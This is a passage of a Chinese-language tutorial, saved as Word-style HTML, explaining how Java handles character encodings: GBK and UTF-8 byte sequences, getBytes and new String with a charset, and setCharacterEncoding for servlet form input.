Roman">iso8859-1</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码，同时也可以用来表示所有语言的字符，不过，</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">utf</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码是不定长编码，每一个字符的长度从</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">1-6</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">个字节不等。另外，</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">utf</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码自带简单的校验功能。一般来讲，英文字母都是用一个字节表示，而汉字使用三个字节。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　注意，虽然说</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">utf</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">是为了使用更少的空间而使用的，但那只是相对于</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">unicode</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码来说，如果已经知道是汉字，则使用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">GB2312/GBK</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">无疑是最节省的。不过另一方面，值得说明的是，虽然</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">utf</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码对汉字使用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">3</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">个字节，但即使对于汉字网页，</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">utf</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码也会比</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">unicode</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码节省，因为网页中包含了很多的英文字符。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">3. java</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">对字符的处理</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　在</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">java</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">应用软件中，会有多处涉及到字符集编码，有些地方需要进行正确的设置，有些地方需要进行一定程度的处理。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">3.1. getBytes(charset)</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　这是</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">java</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">字符串处理的一个标准函数，其作用是将字符串所表示的字符按照</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">charset</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码，并以字节方式表示。注意字符串在</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">java</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">内存中总是按</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">unicode</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码存储的。比如</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">中文</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，正常情况下</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">(</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">即没有错误的时候</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">)</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">存储为</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"4e2d 6587"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，如果</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">charset</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">为</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"gbk"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，则被编码为</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"d6d0 cec4"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，然后返回字节</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"d6 d0 ce c4"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。如果</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">charset</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">为</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"utf8"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">则最后是</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"e4 b8 ad e6 96 87"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。如果是</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"iso8859-1"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，则由于无法编码，最后返回</SPAN><SPAN lang=EN-US><FONT face="Times New Roman"> "3f 3f"(</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">两个问号</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">)</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">3.2. new String(charset)</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　这是</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">java</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">字符串处理的另一个标准函数，和上一个函数的作用相反，将字节数组按照</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">charset</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码进行组合识别，最后转换为</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">unicode</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">存储。参考上述</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">getBytes</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">的例子，</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"gbk" </FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">和</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"utf8"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">都可以得出正确的结果</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"4e2d 6587"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，但</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">iso8859-1</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">最后变成了</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"003f 003f"(</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">两个问号</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">)</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　因为</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">utf8</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">可以用来表示</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">/</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码所有字符，所以</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">new String( str.getBytes( "utf8" ), "utf8" ) === str</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，即完全可逆。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">3.3. setCharacterEncoding()</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　该函数用来设置</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">http</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">请求或者相应的编码。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　对于</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">request</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，是指提交内容的编码，指定后可以通过</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">getParameter()</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">则直接获得正确的字符串，如果不指定，则默认使用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">iso8859-1</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码，需要进一步处理。参见下述</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">表单输入</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">"</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。值得注意的是在执行</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">setCharacterEncoding()</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">之前，不能执行任何</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">getParameter()</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">java doc</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">上说明：</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">This method must be called prior to reading request parameters or reading input using getReader()</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。而且，该指定只对</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">POST</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">方法有效，对</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">GET</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">方法无效。分析原因，应该是在执行第一个</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">getParameter()</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">的时候，</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">java</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">将会按照编码分析所有的提交内容，而后续的</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">getParameter()</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">不再进行分析，所以</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">setCharacterEncoding()</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">无效。而对于</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">GET</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">方法提交表单是，提交的内容在</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">URL</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">中，一开始就已经按照编码分析所有的提交内容，</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">setCharacterEncoding()</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">自然就无效。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　对于</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">response</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，则是指定输出内容的编码，同时，该设置会传递给浏览器，告诉浏览器输出内容所采用的编码。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">3.4. </FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">处理过程</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　下面分析两个有代表性的例子，说明</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">java</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">对编码有关问题的处理方法。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">3.4.1. </FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">表单输入</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">User input *(gbk:d6d0 cec4) browser *(gbk:d6d0 cec4) web server iso8859-1(00d6 00d 000ce 00c4) class</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，需要在</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">class</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">中进行处理：</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">getbytes("iso8859-1")</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">为</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">d6 d0 ce c4</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">new String("gbk")</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">为</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">d6d0 cec4</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，内存中以</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">unicode</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码则为</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">4e2d 6587</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">l </FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">用户输入的编码方式和页面指定的编码有关，也和用户的操作系统有关，所以是不确定的，上例以</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">gbk</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">为例。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">l </FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">从</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">browser</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">到</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">web server</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，可以在表单中指定提交内容时使用的字符集，否则会使用页面指定的编码。而如果在</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">url</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">中直接用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">?</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">的方式输入参数，则其编码往往是操作系统本身的编码，因为这时和页面无关。上述仍旧以</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">gbk</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码为例。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">l Web server</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">接收到的是字节流，默认时</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">(getParameter)</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">会以</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">iso8859-1</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码处理之，结果是不正确的，所以需要进行处理。但如果预先设置了编码</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">(</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">通过</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">request. setCharacterEncoding ())</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，则能够直接获取到正确的结果。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">l </FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">在页面中指定编码是个好习惯，否则可能失去控制，无法指定正确的编码。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">3.4.2. </FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">文件编译</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
